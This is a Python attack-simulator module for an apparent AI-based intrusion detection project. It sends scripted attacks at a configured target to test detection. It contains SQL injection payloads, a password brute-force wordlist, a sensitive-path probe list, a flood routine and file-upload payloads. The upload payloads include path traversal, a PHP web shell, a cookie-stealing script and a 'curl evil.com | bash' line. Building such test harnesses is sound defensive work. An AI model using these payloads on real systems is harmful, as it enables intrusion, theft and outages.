"""
Attack Simulator — fires scripted attack scenarios at the target environment.
Simulates the kinds of threats the immune system must detect and respond to.

Usage:
    python -m simulation.attack_simulator
    python -m simulation.attack_simulator --attack sql_injection
    python -m simulation.attack_simulator --continuous
"""
import asyncio
import argparse
import random
import time
from datetime import datetime

import httpx

from config.settings import settings
from config.logging_config import setup_logging

logger = setup_logging("attack_simulator")

TARGET = settings.simulation_target_url


# ─────────────────────────────────────────────
# Attack Type 1: SQL Injection
# ─────────────────────────────────────────────

SQL_PAYLOADS = [
    {"username": "admin' OR '1'='1", "password": "x"},
    {"username": "admin'--", "password": "anything"},
    {"username": "' UNION SELECT 1,2,3--", "password": "x"},
    {"username": "admin'; DROP TABLE users;--", "password": "x"},
    {"username": "' OR 1=1--", "password": "' OR 1=1--"},
    {"username": "admin' AND 1=1--", "password": "x"},
]


async def attack_sql_injection(client: httpx.AsyncClient):
    logger.warning("[ATTACK] Launching SQL Injection attack")
    payload = random.choice(SQL_PAYLOADS)
    try:
        resp = await client.post(f"{TARGET}/login", json=payload, timeout=5)
        logger.info(f"[ATTACK] SQL Injection response: {resp.status_code} — payload: {payload}")
    except Exception as e:
        logger.error(f"[ATTACK] SQL Injection failed to connect: {e}")


# ─────────────────────────────────────────────
# Attack Type 2: Brute Force Login
# ─────────────────────────────────────────────

WORDLIST = [
    "password", "123456", "admin", "letmein", "qwerty", "abc123",
    "monkey", "1234567", "12345678", "pass", "root", "test", "iloveyou",
    "dragon", "master", "666666", "superman", "batman", "trustno1",
]


async def attack_brute_force(client: httpx.AsyncClient, burst: int = 30):
    logger.warning(f"[ATTACK] Launching Brute Force attack ({burst} attempts)")
    tasks = []
    for password in (WORDLIST * 3)[:burst]:
        tasks.append(
            client.post(
                f"{TARGET}/login",
                json={"username": "admin", "password": password},
                timeout=3,
            )
        )
    results = await asyncio.gather(*tasks, return_exceptions=True)
    success = sum(1 for r in results if isinstance(r, httpx.Response) and r.status_code == 200)
    logger.info(f"[ATTACK] Brute Force: {burst} attempts, {success} successes")


# ─────────────────────────────────────────────
# Attack Type 3: Port Scan / Enumeration
# ─────────────────────────────────────────────

SCAN_PATHS = [
    "/admin", "/config", "/.env", "/api/v1/users", "/api/v2/users",
    "/backup", "/db", "/database", "/wp-admin", "/phpmyadmin",
    "/shell", "/cmd", "/.git/config", "/server-status", "/actuator",
    "/metrics", "/debug", "/console", "/swagger", "/api-docs",
    "/graphql", "/rest", "/secret", "/private", "/hidden",
    "/token", "/auth", "/oauth", "/keys", "/certs", "/ssl",
    "/robots.txt", "/sitemap.xml", "/crossdomain.xml",
]


async def attack_port_scan(client: httpx.AsyncClient):
    logger.warning(f"[ATTACK] Launching Port Scan / Enumeration ({len(SCAN_PATHS)} paths)")
    tasks = [client.get(f"{TARGET}{path}", timeout=2) for path in SCAN_PATHS]
    results = await asyncio.gather(*tasks, return_exceptions=True)
    found = [
        SCAN_PATHS[i]
        for i, r in enumerate(results)
        if isinstance(r, httpx.Response) and r.status_code < 404
    ]
    logger.info(f"[ATTACK] Port Scan found {len(found)} accessible paths: {found}")


# ─────────────────────────────────────────────
# Attack Type 4: File Injection
# ─────────────────────────────────────────────

FILE_PAYLOADS = [
    {
        "filename": "../../../etc/passwd",
        "content": "root:x:0:0:root:/root:/bin/bash",
    },
    {
        "filename": "shell.php",
        "content": "<?php system($_GET['cmd']); ?>",
    },
    {
        "filename": "malware.js",
        "content": "<script>fetch('https://evil.com/steal?c='+document.cookie)</script>",
    },
    {
        "filename": "payload.sh",
        "content": "#!/bin/bash\ncurl -s http://evil.com/c2 | bash",
    },
    {
        "filename": "../../config.py",
        "content": "SECRET_KEY='hacked_by_attacker'",
    },
]


async def attack_file_injection(client: httpx.AsyncClient):
    logger.warning("[ATTACK] Launching File Injection attack")
    payload = random.choice(FILE_PAYLOADS)
    try:
        resp = await client.post(f"{TARGET}/upload", json=payload, timeout=5)
        logger.info(f"[ATTACK] File Injection: {resp.status_code} — file: {payload['filename']}")
    except Exception as e:
        logger.error(f"[ATTACK] File Injection failed: {e}")


# ─────────────────────────────────────────────
# Attack Type 5: DDoS Simulation
# ─────────────────────────────────────────────

async def attack_ddos(client: httpx.AsyncClient, burst: int = 80):
    logger.warning(f"[ATTACK] Launching DDoS simulation ({burst} concurrent requests)")
    endpoints = ["/health", "/users/1", "/search?q=test", "/files"]
    tasks = [
        client.get(f"{TARGET}{random.choice(endpoints)}", timeout=3)
        for _ in range(burst)
    ]
    results = await asyncio.gather(*tasks, return_exceptions=True)
    errors = sum(1 for r in results if isinstance(r, Exception))
    logger.info(f"[ATTACK] DDoS: {burst} requests, {errors} errors")


# ─────────────────────────────────────────────
# Attack dispatcher
# ─────────────────────────────────────────────

ATTACKS = {
    "sql_injection": attack_sql_injection,
    "brute_force": attack_brute_force,
    "port_scan": attack_port_scan,
    "file_injection": attack_file_injection,
    "ddos": attack_ddos,
}


async def run_attack(attack_name: str):
    attack_fn = ATTACKS.get(attack_name)
    if not attack_fn:
        logger.error(f"Unknown attack: {attack_name}. Choose from: {list(ATTACKS.keys())}")
        return

    async with httpx.AsyncClient(
        headers={"X-Forwarded-For": f"10.0.{random.randint(0,255)}.{random.randint(1,254)}"}
    ) as client:
        await attack_fn(client)


async def run_all_attacks_once():
    logger.warning("=" * 60)
    logger.warning(f"[SIMULATOR] Running all attack types — {datetime.utcnow().isoformat()}")
    logger.warning("=" * 60)
    for name, fn in ATTACKS.items():
        async with httpx.AsyncClient(
            headers={"X-Forwarded-For": f"10.0.{random.randint(0,255)}.{random.randint(1,254)}"}
        ) as client:
            await fn(client)
        await asyncio.sleep(2)


async def run_continuous():
    logger.info(
        f"[SIMULATOR] Continuous mode — attacking every {settings.simulation_attack_interval}s"
    )
    while True:
        attack_name = random.choice(list(ATTACKS.keys()))
        await run_attack(attack_name)
        wait = settings.simulation_attack_interval + random.randint(-3, 3)
        logger.info(f"[SIMULATOR] Next attack in {wait}s...")
        await asyncio.sleep(wait)


# ─────────────────────────────────────────────
# Entry point
# ─────────────────────────────────────────────

def main():
    parser = argparse.ArgumentParser(description="Autonomous AI Immune System — Attack Simulator")
    parser.add_argument(
        "--attack",
        choices=list(ATTACKS.keys()) + ["all"],
        default="all",
        help="Specific attack to run (default: all)",
    )
    parser.add_argument(
        "--continuous",
        action="store_true",
        help="Run attacks continuously at random intervals",
    )
    args = parser.parse_args()

    if args.continuous:
        asyncio.run(run_continuous())
    elif args.attack == "all":
        asyncio.run(run_all_attacks_once())
    else:
        asyncio.run(run_attack(args.attack))


if __name__ == "__main__":
    main()
